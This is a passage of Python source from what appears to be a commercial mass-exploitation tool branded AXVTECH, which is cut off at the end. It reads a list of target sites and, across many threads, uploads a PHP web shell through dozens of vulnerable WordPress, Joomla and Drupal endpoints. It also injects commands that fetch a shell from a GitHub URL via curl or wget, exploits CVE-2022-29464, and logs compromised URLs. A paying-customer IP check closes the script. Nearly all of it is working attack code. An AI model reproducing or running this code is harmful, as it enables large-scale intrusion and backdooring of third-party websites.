            Expcaitcsv = requests.get('http://' + domain + '/wp-content/uploads/axv.php', headers=ua, timeout=10, verify=False)
            Expcaitcsv2 = requests.get(f'http:/{domain}/wp-content/uploads/{tahun}/{bulan}/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expcaitcsv.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}AIT CSV Import -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/uploads/axv.php\n')
            elif 'AXVTECH' in str(Expcaitcsv2.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}AIT CSV Import -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/uploads/{tahun}/{bulan}/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}AIT CSV Import -->> {red}Not Vuln !")
        except:pass

        # contact-form-7
        try:
            requests.post(f'https://{domain}/wp-content/plugins/contact-form-7/modules/file.php', files={"zip":('axv.php',shell.encode(), "text/html")}, timeout=30, headers=ua, verify=False)
            Expform7 = requests.get('http://' + domain + '/wp-content/plugins/contact-form-7/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expform7.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}contact-form-7 -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/plugins/contact-form-7/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}contact-form-7 -->> {red}Not Vuln !")
        except:pass
        

        # mod_socialpinboard_menu
        try:
            filesocialpinboard = {'uploadfile':('axv.php', shell,'text/html')}
            socialpinboard = requests.post(f'https://{domain}/modules/mod_socialpinboard_menu/saveimagefromupcom_collectorload.php', files=filesocialpinboard, timeout=30, headers=ua, verify=False).text
            tokensocialpinboard = re.findall('(.*?).php', socialpinboard)
            Expsocialpinboar = requests.get('http://' + domain + '/modules/mod_socialpinboard_menu/images/socialpinboard/temp/' + tokensocialpinboard[0] + '.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expsocialpinboar.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}mod_socialpinboard_menu -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write('http://' + domain + '/modules/mod_socialpinboard_menu/images/socialpinboard/temp/' + tokensocialpinboard[0] + '.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}mod_socialpinboard_menu -->> {red}Not Vuln !")
        except:pass

        # com_novasfh
        try:
            PostFilenovasfh = {'uploadfile':('axv.php', shell,'text/html')}
            requests.post(f'https://{domain}/administrator/index.php?option=com_novasfh&c=uploader', files=PostFilenovasfh, timeout=30, headers=ua, verify=False)
            Expnovasfh = requests.get('http://' + domain + '/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expnovasfh.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_novasfh -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_novasfh -->> {red}Not Vuln !")
        except:pass

        # com_collector
        try:
            PostFilecollector = {'uploadfile':('axv.php', shell,'text/html')}
            requests.post(f'https://{domain}/index.php?option=com_collector&view=filelist&tmpl=component&folder=&type=1', files=PostFilecollector, timeout=30, headers=ua, verify=False)
            Expcollector = requests.get('http://' + domain + '/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expcollector.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_collector -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_collector -->> {red}Not Vuln !")
        except:pass

        # com_ksadvertiser
        try:
            PostFileksadvertiser = {'uploadfile':('axv.php', shell,'text/html')}
            requests.post(f'https://{domain}/index.php?option=com_ksadvertiser&Itemid=36&task=add&catid=0&lang=en', files=PostFileksadvertiser, timeout=30, headers=ua, verify=False)
            Expksadvertiser = requests.get('http://' + domain + '/images/ksadvertiser/U0/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expksadvertiser.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_ksadvertiser -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/images/ksadvertiser/U0/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_ksadvertiser -->> {red}Not Vuln !")
        except:pass

        # mod_jfancy
        try:
            PostFilejfancy = {'uploadfile':('axv.php', shell,'text/html')}
            requests.post(f'https://{domain}/modules/mod_jfancy/script.php', files=PostFilejfancy, timeout=30, headers=ua, verify=False)
            Expjfancy = requests.get('http://' + domain + '/images/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expjfancy.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}mod_jfancy -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/images/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}mod_jfancy -->> {red}Not Vuln !")
        except:pass

        # augmented-reality
        try:
            requests.post(f'https://{domain}/wp-content/plugins/augmented-reality/vendor/elfinder/php/connector.minimal.php', data={'cmd': 'mkfile','target': 'l1_Lw','name': 'axv.php'}, timeout=30, headers=ua, verify=False)
            time.sleep(0.3)
            requests.post(f'https://{domain}/wp-content/plugins/augmented-reality/vendor/elfinder/php/connector.minimal.php', data={"cmd" : "put", "target":"l1_L1xpem9jaW4ucGhw", "content": shell}, timeout=30, headers=ua, verify=False)
            Expaugmented = requests.get('http://' + domain + '/wp-content/plugins/augmented-reality/file_manager/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expaugmented.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}augmented-reality -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/plugins/augmented-reality/file_manager/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}augmented-reality -->> {red}Not Vuln !")
        except:pass


        # ez-done-file-manager
        try:
            casoez_done = ['axv.php','axv.php;.jpg','axv.csv.phtml']
            for izoez_done in casoez_done:
                try:
                    sez_done = requests.Session()
                    sez_done.post(f"https://{domain}/wp-content/plugins/ez-done-file-manager/admin.php",files={"zip":(izoez_done,shell.encode(), "text/html")}, timeout=30, headers=ua, verify=False)
                    time.sleep(0.3)
                    Checkez_done = sez_done.get(f'http://{domain}/wp-content/plugins/ez-done-file-manager/{izoez_done}', headers=ua, timeout=10, verify=False)
                    if 'AXVTECH' in str(Checkez_done.text):
                        print(f"{blue}|- {white}http://{domain} {white}| {yellow}ez-done-file-manager -->> {green}Exploited !")
                        open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/plugins/ez-done-file-manager/{izoez_done}\n')
                    else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}ez-done-file-manager -->> {red}Not Vuln !")
                except:pass
            sez_done.close()
        except:pass


        # Yoast SEO
        try:
            casoYseo = ['axv.php','axv.php;.jpg','axv.csv.phtml']
            for izoYseo in casoYseo:
                try:
                    sYseo = requests.Session()
                    sYseo.post(f"https://{domain}/wp-content/admin/views/tool-file-editor.php",files={"zip":(izoYseo,shell.encode(), "text/html")}, headers=ua, timeout=30, verify=False)
                    time.sleep(0.3)
                    CheckYseo = sYseo.get(f'http://{domain}/wp-content/plugins/admin/views/{izoYseo}', headers=ua, timeout=10, verify=False)
                    if 'AXVTECH' in str(CheckYseo.text):
                        print(f"{blue}|- {white}http://{domain} {white}| {yellow}ez-done-file-manager -->> {green}Exploited !")
                        open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/plugins/admin/views/{izoYseo}\n')
                    else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}ez-done-file-manager -->> {red}Not Vuln !")
                except:pass
            sYseo.close()
        except:pass

        #wp-mail-smtp
        try:
            requests.post(f'https://{domain}/wp-content/plugins/wp-mail-smtp/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php', data={'row_id':'curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php'}, timeout=30, headers=ua, verify=False)
            Expmasmtp = requests.get('http://' + domain + '/wp-content/plugins/wp-mail-smtp/vendor/woocommerce/action-scheduler/classes/abstracts/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expmasmtp.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}wp-mail-smtp -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/plugins/wp-mail-smtp/vendor/woocommerce/action-scheduler/classes/abstracts/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}wp-mail-smtp -->> {red}Not Vuln !")
        except:pass

        #wp-mail-smtp-pro
        try:
            requests.post(f'https://{domain}/wp-content/plugins/wp-mail-smtp-pro/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php', data={'row_id':'curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php'}, timeout=30, headers=ua, verify=False)
            Expmasmtppro = requests.get('http://' + domain + '/wp-content/plugins/wp-mail-smtp-pro/vendor/woocommerce/action-scheduler/classes/abstracts/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expmasmtppro.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}wp-mail-smtp-pro -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/plugins/wp-mail-smtp-pro/vendor/woocommerce/action-scheduler/classes/abstracts/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}wp-mail-smtp-pro -->> {red}Not Vuln !")
        except:pass

        #wpforms
        try:
            requests.post(f'https://{domain}/wp-content/plugins/wpforms/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php', data={'row_id':'curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php'}, timeout=30, headers=ua, verify=False)
            Expwpforms = requests.get('http://' + domain + '/wp-content/plugins/wpforms/vendor/woocommerce/action-scheduler/classes/abstracts/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expwpforms.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}wpforms -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/plugins/wpforms/vendor/woocommerce/action-scheduler/classes/abstracts/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}wpforms -->> {red}Not Vuln !")
        except:pass

        #wpforms-lite
        try:
            requests.post(f'https://{domain}/wp-content/plugins/wpforms-lite/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php', data={'row_id':'curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php'}, timeout=30, headers=ua, verify=False)
            Expwpformslite = requests.get('http://' + domain + '/wp-content/plugins/wpforms-lite/vendor/woocommerce/action-scheduler/classes/abstracts/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expwpformslite.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}wpforms-lite -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/plugins/wpforms-lite/vendor/woocommerce/action-scheduler/classes/abstracts/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}wpforms-lite -->> {red}Not Vuln !")
        except:pass

        #zionbuilder
        try:
            requests.post(f'https://{domain}/wp-content/plugins/zionbuilder/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php', data={'row_id':'curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php'}, timeout=30, headers=ua, verify=False)
            Expwpzionbuilder = requests.get('http://' + domain + '/wp-content/plugins/zionbuilder/vendor/woocommerce/action-scheduler/classes/abstracts/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expwpzionbuilder.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}zionbuilder -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/plugins/zionbuilder/vendor/woocommerce/action-scheduler/classes/abstracts/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}zionbuilder -->> {red}Not Vuln !")
        except:pass

        #blk
        try:
            backdoors = f'echo \'AXVTECH\';fwrite(fopen(\'axvShells.php\',\'w+\'),\'{shell}\');'
            encoded_phpblk = base64.b64encode(backdoors.encode()).decode()
            blkShll = requests.get(f'http://{domain}/wp-admin/css/colors/blue/blue.php?wall={encoded_phpblk}', timeout=10, headers=ua, verify=False).content.decode()
            if 'AXVTECH' in blkShll:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}BV -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-admin/css/colors/blue/axvShells.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}BV -->> {red}Not Vuln !")
        except:pass

        # SupportCandy
        try:
            izoCandy = 'axv.php'
            dataCandy = {'file':(izoCandy, shell, 'text/html')}
            getmeCandy = requests.post(f'https://{domain}/wp-admin/admin-ajax.php?action=wpsc_tickets&setting_action=rb_upload_file',headers=ua,files=dataCandy,timeout=30,verify=False)
            tokCandy = re.findall(r'\/wp-content\/uploads\/wpsc\/(.*?)_'+izoCandy, getmeCandy.text)
            IndexPathCandy = f'http://{domain}/wp-content/uploads/wpsc/'+tokCandy[0]+'_'+izoCandy        
            CheckIndexCandy = requests.get(IndexPathCandy, timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in str(CheckIndexCandy.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}zionbuilder -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-content/uploads/wpsc/{tokCandy[0]}_{izoCandy}\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}zionbuilder -->> {red}Not Vuln !")
        except:pass

        # Drupal8 Timezone
        try:
            commandTimezone = ('echo "axvtech"')
            data1Timezone = f'https://{domain}/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            data2Timezone = {'form_id':'user_register_form','_drupal_ajax':'1','timezone[a][#lazy_builder][]':'passthru','timezone[a][#lazy_builder][][]':commandTimezone}
            ambushTimezone = requests.post(data1Timezone, data=data2Timezone, timeout=20, headers=ua).text

            command2Timezone = ('curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php')
            data3Timezone = f'https://{domain}/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            data4Timezone = {'form_id':'user_register_form','_drupal_ajax':'1','timezone[a][#lazy_builder][]':'passthru','timezone[a][#lazy_builder][][]':command2Timezone}
            jembitTimezone = requests.post(data3Timezone, data=data4Timezone, timeout=20, headers=ua).text
            kontooolTimezone = requests.get(f'http://{domain}/axv.php')

            command3Timezone = ('curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php > /sites/default/files/axv.php')
            data100Timezone = f'https://{domain}/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            data200Timezone = {'form_id':'user_register_form','_drupal_ajax':'1','timezone[a][#lazy_builder][]':'passthru','timezone[a][#lazy_builder][][]':command3Timezone}
            pepekTimezone = requests.post(data100Timezone, data=data200Timezone,timeout=20, headers=ua)
            kontiilTimezone = requests.get(f'http://{domain}/sites/default/files/axv.php', headers=ua, timeout=10, verify=False)
            if 'axvtech' in ambushTimezone:
                if 'AXVTECH' in kontooolTimezone.text:
                    print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal8 Timezone -->> {green}Exploited !")
                    open('results/ShellsExploit.txt','a+').write(f'http://{domain}/axv.php\n')
                else:
                    if 'AXVTECH' in kontiilTimezone.text:
                        print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal8 Timezone -->> {green}Exploited !")
                        open('results/ShellsExploit.txt','a+').write(f'http://{domain}/sites/default/files/axv.php\n')
                    else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal8 Timezone -->> {red}Failed Exploit !")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal8 Timezone -->> {red}Not Vuln !")
        except:pass

        # Drupal8 Mail
        try:
            commandmail = ('echo "axvtech"')
            url1mail = f'https://{domain}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
            payloadmail = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup', 'mail[#markup]':commandmail}
            ambush2mail = requests.post(url1mail, data=payloadmail, timeout=20, headers=ua).text
            url2 = f'https://{domain}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
            payload2mail = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup', 'mail[#markup]':'curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php'}
            requests.post(url2, data=payload2mail, timeout=20, headers=ua).text
            blamail = requests.get(f'http://{domain}/axv.php')
            cekdirmail = f'http://{domain}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            hajarmail = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup', 'mail[#markup]':'curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php > /sites/default/files/axv.php'}
            requests.post(cekdirmail, data=hajarmail,timeout=20, headers=ua)
            kontillmail = requests.get(f"http://{domain}/sites/default/files/axv.php", headers=ua, timeout=10, verify=False).text
            if 'axvtech' in ambush2mail:
                if 'AXVTECH' in blamail.text:
                    print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal8 Mail -->> {green}Exploited !")
                    open('results/ShellsExploit.txt','a+').write(f'http://{domain}/axv.php\n')
                else:
                    if 'AXVTECH' in kontillmail:
                        print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal8 Mail -->> {green}Exploited !")
                        open('results/ShellsExploit.txt','a+').write(f'http://{domain}/sites/default/files/axv.php\n')
                    else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal8 Mail -->> {red}Failed Exploit !")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal8 Mail -->> {red}Not Vuln !")
        except:pass

        #CmsMadeSimple
        try:
            somCmsMadeSimple = "/index.php?mact=News,cntnt01,detail,0&cntnt01articleid=1&cntnt01detailtemplate=string:{php}echo system('echo axv');{/php}&cntnt01returnid=1"
            requests.get('http://' + domain + "/index.php?mact=News,cntnt01,detail,0&cntnt01articleid=1&cntnt01detailtemplate=string:{php}echo system('cd tmp/cache;wget https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php');{/php}&cntnt01returnid=1",timeout=30, headers=ua, verify=False)
            CheckShellyCmsMadeSimple = requests.get('http://' + domain + somCmsMadeSimple, headers=ua, verify=False, timeout=10)
            CheckShellCmsMadeSimple = requests.get('http://' + domain + '/tmp/cache/axv.php', headers=ua, verify=False, timeout=10)
            if 'axvtech' in CheckShellyCmsMadeSimple.text:
                if 'AXVTECH' in CheckShellCmsMadeSimple.text:
                    print(f"{blue}|- {white}http://{domain} {white}| {yellow}CmsMadeSimple -->> {green}Exploited !")
                    open('results/ShellsExploit.txt','a+').write(f'http://{domain}/tmp/cache/axv.php\n')
                else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CmsMadeSimple -->> {red}Failed Exploit !")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CmsMadeSimple -->> {red}Not Vuln !")
        except:pass

        #jquerypicturecut-lite
        try:
            PostFilejquerypicturecut = {'inputOfFile': ('axv.php', shell, 'text/html')}
            cokjquerypicturecut = {"request":"upload","inputOfFile":"inputOfFile","enableResize":"0","minimumWidthToResize":"0","folderOnServer":"/","imageNameRandom":"0","enableMaximumSize":"0","minimumWidthToResize":"0","minimumHeightToResize":"0","maximumSize":"0"}
            requests.post(f'http://{domain}/wp-content/plugins/wpforms-lite/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php', data=cokjquerypicturecut, files=PostFilejquerypicturecut, timeout=30, headers=ua, verify=False)
            Expjquerypicturecut = requests.get('http://' + domain + '/jquery-picture-cut/src/php/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expjquerypicturecut.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}wpforms-lite -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/jquery-picture-cut/src/php/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}wpforms-lite -->> {red}Not Vuln !")
        except:pass

        # Tiki-Calendar
        try:
            somTiki="/tiki-calendar.php?viewmode=%27;%20$z=fopen%28%22shellAXV.php%22,%27w%27%29;fwrite%28$z,file_get_contents%28%22https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axvuploader.php%22%29%29;fclose%28$z%29;%27"
            requests.get(f'http://{domain}{somTiki}', headers=ua, timeout=15, verify=False)
            CheckShellTiki = requests.get(f'http://{domain}/shellAXV.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(CheckShellTiki.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}tiki-calendar -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}shellAXV.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}tiki-calendar -->> {red}Not Vuln !")
        except:pass

        # CVE-2022-29464
        try:
            files29464 = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/axvShells.jsp": shell}
            requests.post(f'http://{domain}/fileupload/toolsAny', files=files29464, headers=ua, timeout=20, verify=False)
            check29464 = requests.get(f'http://{domain}/authenticationendpoint/axvShells.jsp',headers=ua, timeout=7, verify=False).text
            if "AXVTECH" in check29464:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2022-29464 -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/authenticationendpoint/axvShells.jsp\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2022-29464 -->> {red}Not Vuln !")
        except:pass
        
        try:
            data = {'file':open (php, 'rb')}
            p = ('https://' + domain + '/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../')
            c = ('http://' + domain + '/components/com_b2jcontact/axv.php')
            requests.post(p, headers=ua, files=data, timeout=20)
            get = requests.get(c, headers=ua, timeout=10)
            if 'AXVTECH' in get.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_B2j -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_B2j -->> {red}Not Vuln !")
        except:pass     
        
        try:
            pay = {'name' : 'me.php',
                'drop_data' : '1',
                'overwrite': '1',
                'field_delimiter': ',',
                'text_delimiter' : '&quot;',
                'option' : 'com_fabrick',
                'controller' : 'import',
                'view' : 'import',
                'task' : 'doimport',
                'Itemid' : '0',
                'tableid' : '0'}
            data = {'userfile':open (php, 'rb')}
            p = ('https://' + domain + '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1')
            c = ('http://' + domain+'/media/axv.php')
            requests.post(p, headers=ua, files=data, data=pay, timeout=20)
            get = requests.get(c, headers=ua, timeout=10)
            if 'AXVTECH' in get.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Fabrik -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Fabrik -->> {red}Not Vuln !")
        except:pass    
          
        try:
            data = {'raw_data':(php, shell, 'text/html')}
            p = ('https://' + domain + '/components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php')
            c = ('http://' + domain+'/axv.php')
            requests.post(p, headers=ua, data={'path':'/../../../'}, files=data, timeout=20)
            get = requests.get(c, headers=ua, timeout=10)
            if 'AXVTECH' in get.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Oziogallery 2 -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Oziogallery 2 -->> {red}Not Vuln !")
        except:pass
        
        try:
            data = {'uploadfile':open (php, 'rb')}
            p = ('https://' + domain + '/modules/mod_socialpinboard_menu/saveimagefromupload.php')
            c = ('http://' + domain+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/axv.php')
            requests.post(p, headers=ua, files=data, timeout=20)
            get = requests.get(c, headers=ua, timeout=10)
            if 'AXVTECH' in get.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Mod_Socialpinboard_Menu -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Mod_Socialpinboard_Menu -->> {red}Not Vuln !")
        except:pass 
        
        try:
            data = {'Filedata':(php, shell, 'text/html')}
            p = ('https://' + domain + '/administrator/components/com_extplorer/uploadhandler.php')
            c = ('http://' + domain+'/images/stories/axv.php')
            requests.post(p, headers=ua, files=data, timeout=20)
            get = requests.get(c, headers=ua, timeout=10)
            if 'AXVTECH' in get.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Extplorer 2 -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Extplorer 2 -->> {red}Not Vuln !")
        except:pass 
        
        try:
            data = {'file':open (shell, 'rb')}
            p = ('https://' + domain + '/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=axv.php')
            c = ('http://' + domain+'/administrator/components/com_redmystic/chart/tmp-upload-images/axv.php')
            requests.post(p, headers=ua, data=data, timeout=20)
            get = requests.get(c, headers=ua, timeout=10)
            if 'AXVTECH' in get.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Redmystic -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Redmystic -->> {red}Not Vuln !")
        except:pass 
        
        try:
            data = {'uploadfile':open (php, 'rb')}
            p = ('https://' + domain + '/com_hwdvideoshare/assets/uploads/flash/flash_upload.php?jqUploader=1')
            c = ('http://' + domain+'/tmp/axv.php')
            requests.post(p, headers=ua, files=data, timeout=20)
            get = requests.get(c, headers=ua, timeout=10)
            if 'AXVTECH' in get.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Hwdvideoshare -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Hwdvideoshare -->> {red}Not Vuln !")
        except:pass 
        
        try:
            data = {'file':open (phtml, 'rb')}
            p = ('https://' + domain + '/index.php?option=com_djclassifieds&task=upload&tmpl=component')
            c = ('http://' + domain+'/tmp/djupload/axv.phtml')
            requests.post(p, headers=ua, files=data, data={'name':'axv.phtml'}, timeout=20)
            get = requests.get(c, headers=ua, timeout=10)
            if 'AXVTECH' in get.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Djclassifieds -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Djclassifieds -->> {red}Not Vuln !")
        except:pass
        
        try:
            data = {'uploadfile':open (php, 'rb')}
            p = ('https://' + domain + '/osproperty/?task=agent_register')
            c = ('http://' + domain+'/images/osproperty/agent/axv.php')
            requests.post(p, headers=ua, files=data, timeout=20)
            get = requests.get(c, headers=ua, timeout=10)
            if 'AXVTECH' in get.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Osproperty -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Osproperty -->> {red}Not Vuln !")
        except:pass 

    # End Exploit
    except:pass
    
    
    
def Main():
    file_path = input(f"{red}[{white}#{red}]{white} LIST SITE : ")
    with codecs.open(file_path, mode='r', errors='ignore', encoding='utf-8') as file:
        domain = file.read().splitlines()
    thr = int(input(f"{red}[{white}#{red}]{white} THREADS (Max 50): "))
    ThreadPool = Pool(thr)
    ThreadPool.map(exPP, domain)
    
    
if __name__ == "__main__":
    try:
        reqipx = requests.get('http://apis.axvtech.id/DataIPCustomer?apikey=4xvt3cchHAp1i', headers=ua, verify=False, timeout=30).json()
        reqip = ''.join(reqipx)
        youip = requests.get('https://axvtech.id/cekip.php', headers=ua, verify=False, timeout=30).text
        youip = youip.strip()
        print(f"\t{red}[{white}!{red}]{white} Your IP : {yellow}{youip}")
        print(f"\t{red}[{white}-{red}]{white} WAIT...CHECKING YOUR IP IN DATABASE")
        time.sleep(3)
        if youip in reqip:
            id_tele = reqipx.get(youip)["id"]
            print(id_tele)
            print(f"\t{red}[{white}!{red}]{green} IP VALID!")
            time.sleep(2)
            clear()
            gui()
